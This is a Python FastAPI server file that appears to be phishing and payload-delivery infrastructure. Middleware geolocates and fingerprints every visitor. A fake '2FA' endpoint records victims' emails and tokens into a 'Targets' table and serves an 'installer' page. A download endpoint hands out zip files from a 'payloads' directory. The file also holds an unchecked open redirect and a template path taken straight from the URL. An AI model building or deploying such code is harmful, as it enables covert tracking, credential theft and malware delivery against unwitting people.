from fastapi import FastAPI, Request, Response
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware
from fastapi.middleware.gzip import GZipMiddleware
from fastapi.encoders import jsonable_encoder
from fastapi.responses import JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.responses import FileResponse

from datetime import datetime
from os.path import exists

from enums import StatusType, MediaType
from common.datatypes import Fingerprints, Targets
from common.database import db_session, init_db
from lambdas import GenUUID, EncodeAES, DateNow
from typing import Optional
from services.ipapi_service import IPAPIService
from services.tip_service import TIPService
from common import Config
import re

app = FastAPI()
app.add_middleware(HTTPSRedirectMiddleware)
app.add_middleware(GZipMiddleware, minimum_size=1000)
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

if not init_db():
    raise Exception('could not create db!')

PAT_INVALID_IP_ADDRESSES = re.compile(r'([a-zA-Z]{9})|(0.0.0.0)|(169.245.*.*)|(255.*.*.*)')


@app.middleware('http')
async def add_fingerprint_record(request: Request, call_next):
    try:
        response: Response = await call_next(request)
        hostname = None
        host = request.client.host
        if not PAT_INVALID_IP_ADDRESSES.match(host):
            ipapi_data = await ipapi_recon(host)
            uid = GenUUID(host)
            ip = ipapi_data['ip'] if 'ip' in ipapi_data else None
            hostname = ipapi_data['hostname'] if 'hostname' in ipapi_data else None
            ip_type = ipapi_data['type'] if 'type' in ipapi_data else None
            continent_code = ipapi_data['continent_code'] if 'continent_code' in ipapi_data else None
            continent_name = ipapi_data['continent_name'] if 'continent_name' in ipapi_data else None
            country_code = ipapi_data['country_code'] if 'country_code' in ipapi_data else None
            country_name = ipapi_data['country_name'] if 'country_name' in ipapi_data else None
            region_code = ipapi_data['region_code'] if 'region_code' in ipapi_data else None
            region_name = ipapi_data['region_name'] if 'region_name' in ipapi_data else None
            city = ipapi_data['city'] if 'city' in ipapi_data else None
            zipcode = ipapi_data['zip'] if 'zip' in ipapi_data else None
            latitude = ipapi_data['latitude'] if 'latitude' in ipapi_data else None
            longitude = ipapi_data['longitude'] if 'longitude' in ipapi_data else None
            location = ipapi_data['location'] if 'location' in ipapi_data else None
            security = ipapi_data['security'] if 'security' in ipapi_data else None

        if hostname:
            tip_data = await tip_recon(hostname)
            infra_analysis = tip_data['infrastructureAnalysis']
            ssl_cert_chain = tip_data['sslCertificatesChain']
            ssl_configuration = tip_data['sslConfiguration']
            malware_check = tip_data['malwareCheck']
            connected_domains = tip_data['connectedDomains']
            reputation = tip_data['reputation']

            req_path = request.url.path
            req_params = request.url.query

            fingerprint = Fingerprints(uid=uid, ip=ip, hostname=hostname, ip_type=ip_type, continent_code=continent_code,
                                       country_name=country_name, country_code=country_code, continent_name=continent_name,
                                       region_code=region_code, region_name=region_name, city=city, zipcode=zipcode,
                                       latitude=latitude, longitude=longitude, location=location, security=security,
                                       time_created=datetime.now().ctime(), request_path=req_path,
                                       request_params=req_params, infra_analysis=infra_analysis,
                                       ssl_cert_chain=ssl_cert_chain, ssl_configuration=ssl_configuration,
                                       malware_check=malware_check, connected_domains=connected_domains,
                                       reputation=reputation)
            db_session.add(fingerprint)
            db_session.commit()
        return response
    except Exception as e:
        content = {
            "status": StatusType.FAILED.value,
            "host": request.client.host,
            "timestamp": DateNow()
        }
        json = jsonable_encoder(obj=content)
        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)


@app.middleware('http')
async def add_recon_headers(request: Request, call_next):
    try:
        response: Response = await call_next(request)
        host = request.client.host
        if not PAT_INVALID_IP_ADDRESSES.match(host):

            fingerprint: Optional[Fingerprints] = Fingerprints.query.filter_by(ip=host).first()
            if not fingerprint:
                content = {
                    "status": StatusType.FAILED.value,
                    "timestamp": DateNow()
                }
                json = jsonable_encoder(obj=content)
                return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)
            response.headers["X-RECON-Internet-ID"] = fingerprint.uid
            response.headers["X-RECON-IP"] = EncodeAES(fingerprint.ip).decode()
            response.headers["X-RECON-CITY"] = EncodeAES(fingerprint.city).decode()
            response.headers["X-RECON-REGION-CODE"] = EncodeAES(fingerprint.region_code).decode()
            response.headers["X-RECON-COUNTRY-NAME"] = EncodeAES(fingerprint.country_name).decode()
            response.headers["X-RECON-COUNTRY-CODE"] = EncodeAES(fingerprint.country_code).decode()
            response.headers["X-RECON-CONTINENT-CODE"] = EncodeAES(fingerprint.continent_code).decode()
            response.headers["X-RECON-LATITUDE"] = EncodeAES(str(fingerprint.latitude)).decode()
            response.headers["X-RECON-LONGITUDE"] = EncodeAES(str(fingerprint.longitude)).decode()
            response.headers["X-RECON-LOCATION"] = EncodeAES(str(fingerprint.location)).decode()
            response.headers["X-RECON-SECURITY"] = EncodeAES(str(fingerprint.security)).decode()
            response.headers["X-RECON-INFRA-ANALYSIS"] = EncodeAES(str(fingerprint.infra_analysis)).decode()
            response.headers["X-RECON-SSL-CERTIFICATION-CHAIN"] = EncodeAES(str(fingerprint.ssl_cert_chain)).decode()
            response.headers["X-RECON-SSL-CONFIGURATION"] = EncodeAES(str(fingerprint.ssl_configuration)).decode()
            response.headers["X-RECON-MALWARE-CHECK"] = EncodeAES(str(fingerprint.malware_check)).decode()
            response.headers["X-RECON-CONNECTED-DOMAINS"] = EncodeAES(str(fingerprint.connected_domains)).decode()
            response.headers["X-RECON-REPUTATION"] = EncodeAES(str(fingerprint.reputation)).decode()

        return response
    except Exception:
        content = {
            "status": StatusType.FAILED.value,
            "host": request.client.host,
            "timestamp": DateNow()
        }
        json = jsonable_encoder(obj=content)
        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)


async def ipapi_recon(host, lang='en'):
    try:
        data = IPAPIService().check_host(host).with_language(lang).with_hostname().with_fields().as_json().build().preform()
        return data
    except Exception as e:
        content = {
            "status": StatusType.FAILED.value,
            "host": host,
            "timestamp": DateNow()
        }
        json = jsonable_encoder(obj=content)
        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)


async def tip_recon(domain):
    try:
        data = TIPService().check_domain(domain_name=domain).gather().preform()
        return data
    except Exception as e:
        content = {
            "status": StatusType.FAILED.value,
            "host": domain,
            "timestamp": DateNow()
        }
        json = jsonable_encoder(obj=content)
        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)


@app.get("/api/v1/fingerprints")
async def get_fingerprint(request: Request):
    try:
        fingerprint: Optional[Fingerprints] = Fingerprints.query.filter_by(ip=request.client.host).first()
        if not fingerprint:
            content = {
                "status": StatusType.FAILED.value,
                "timestamp": DateNow()
            }
            json = jsonable_encoder(obj=content)
            return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)
        json = jsonable_encoder(obj=fingerprint)
        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=200)
    except Exception:
        content = {
            "status": StatusType.FAILED.value,
            "timestamp": DateNow()
        }
        json = jsonable_encoder(obj=content)
        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)


@app.get("/")
async def index(request: Request):
    try:
        return templates.TemplateResponse("gateway.html", {"request": request})
    except Exception:
        return templates.TemplateResponse("gateway.html", {"request": request})


@app.get("/anonymous/{t}")
async def task(request: Request, t: str):
    template = f'{t}.html'
    return templates.TemplateResponse(template, {"request": request})


@app.get("/objectify/")
def objectify(url: str = None, o: str = None, p: str = None, h: str = None):
    try:
        return RedirectResponse(url)
    except Exception:
        content = {
            "status": StatusType.SUCCESS.value,
            "timestamp": DateNow(),
            "objectified": {
                "url": EncodeAES(url).decode(),
                "o": EncodeAES(o).decode(),
                "p": EncodeAES(p).decode(),
                "h": EncodeAES(h).decode()
            }
        }
        json = jsonable_encoder(obj=content)
        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)


@app.get("/2fa/")
async def installer(request: Request, bindAccount: str = None, token: str = None):
    try:
        if not bindAccount:
            raise Exception("Email was not passed by the URL")
        if not token:
            raise Exception("Token was not passed by the URL")
        user_register_email = bindAccount
        user_register_token = token
        target_dto = Targets(email=user_register_email, token=user_register_token, first_name="N/a", last_name="N/a")
        db_session.add(target_dto)
        db_session.commit()
        return await task(request, "installer")
    except Exception:
        content = {
            "status": StatusType.FAILED.value,
            "timestamp": DateNow()
        }
        json = jsonable_encoder(obj=content)
        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)


@app.get("/download/")
async def download(binary: str = None):
    try:
        filename = f"{binary}.zip"
        filepath = Config.get_payloads(filename)
        if not exists(filepath):
            content = {
                "status": StatusType.PENDING.value,
                "timestamp": DateNow()
            }
            json = jsonable_encoder(obj=content)
            return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=300)

        return FileResponse(path=filepath, media_type=MediaType.APPLICATION_OCTET.value, filename=filename)
    except Exception:
        content = {
            "status": StatusType.FAILED.value,
            "timestamp": DateNow()
        }
        json = jsonable_encoder(obj=content)
        return JSONResponse(content=json, media_type=MediaType.APPLICATION_JSON.value, status_code=404)


if __name__ == '__main__':
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8443, ssl_keyfile=Config.get_server_key(), ssl_certfile=Config.get_server_crt())
